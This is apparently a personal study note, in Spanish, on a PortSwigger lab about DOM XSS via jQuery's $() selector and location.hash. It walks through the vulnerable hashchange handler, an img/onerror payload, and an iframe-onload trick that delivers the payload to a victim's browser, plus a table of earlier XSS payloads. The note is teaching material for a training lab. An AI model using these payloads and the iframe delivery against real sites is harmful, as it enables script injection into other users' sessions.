---
aliases:
tags:
  - type/concept
type: Concept
linked:
---
# PortSwigger - XSS - DOM XSS in jQuery selector sink using a hashchange event

***
## Explicación

### 🔷 Lo nuevo: Source es `location.hash`

`location.hash` es todo lo que va después del `#` en la URL:
```
https://ejemplo.com/#AQUI_VA_EL_HASH
```
Se usa normalmente para navegar a secciones de una página, como:
```
https://ejemplo.com/#comentarios
```


### 🔷 Lo nuevo: el evento `hashchange`

Es un evento del navegador que se dispara **automáticamente cada vez que el `#` de la URL cambia**. El código vulnerable se ve así:
```javascript
$(window).on('hashchange', function() {
    // Cuando el hash cambia, jQuery busca un elemento que matchee
    let post = $(location.hash)  // ← source Y sink al mismo tiempo
    // Si encuentra el post, hace scroll hasta él
    $('html, body').animate({ scrollTop: post.offset().top }, 0);
});
```

El problema: `$(location.hash)` usa el hash como **selector de jQuery**, pero jQuery también acepta **HTML** como selector, no solo CSS selectors como `#id` o `.clase`.


### 🔷 ¿Cómo se explota el selector `$()`?

Si pasás HTML en vez de un selector normal, jQuery lo **crea en el DOM**:

```javascript
$('<img src=x onerror=print()>')  // jQuery crea el elemento y lo inserta
```

Entonces el hash malicioso sería:
```
#<img src=x onerror=print()>
```


### 🔷 Lo nuevo: entregar el exploit a la víctima

Los labs anteriores te atacabas a vos mismo. Acá hay que **hacer que otra persona ejecute el payload**, porque `print()` tiene que correr en el navegador de la víctima.

El problema de mandárselo directamente es que los navegadores modernos **no disparan `hashchange`** si la página ya está cargada con ese hash desde el inicio. La solución es usar un `<iframe>`:

```html
<!-- Esto va en el exploit server -->
<iframe 
  src="https://vulnerable.com/#" 
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

¿Por qué funciona esto?
1. El `iframe` carga la página vulnerable con `#` vacío
2. Cuando termina de cargar (`onload`), **cambia el hash** agregándole el payload
3. Ese cambio **dispara el evento `hashchange`** dentro del iframe
4. jQuery procesa el hash malicioso y ejecuta `print()` 💥


### 🔷 El flujo del lab

```
Víctima visita tu exploit server
          ↓
  iframe carga la página vulnerable
          ↓
  onload cambia el hash al payload
          ↓
  hashchange se dispara automáticamente
          ↓
        SOURCE + SINK
  $(location.hash) recibe HTML malicioso
          ↓
  jQuery crea <img src=x onerror=print()>
          ↓
  print() se ejecuta en el navegador de la víctima 💥
```


### 🔷 Comparación de los cuatro labs

| | Lab 1 | Lab 2 | Lab 3 | Lab 4 |
|---|---|---|---|---|
| **Source** | `location.search` | `location.search` | `location.search` | `location.hash` |
| **Sink** | `document.write` | `innerHTML` | `attr("href")` | `$()` selector |
| **Payload** | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>` | `javascript:alert(document.cookie)` | `<img src=x onerror=print()>` |
| **Trigger** | Automático | Automático | Click | Automático |
| **Víctima** | Vos mismo | Vos mismo | Vos mismo | Otra persona |


### 💡 Reglas para recordar

> - **`location.hash`** = todo después del `#` en la URL
> - **`hashchange`** se dispara automáticamente cuando el `#` cambia
> - **`$()`** de jQuery es peligroso porque acepta HTML, no solo selectores
> - Cuando hay que atacar a una víctima, el truco del **`iframe` + `onload`** fuerza el disparo del evento


___

## Solución

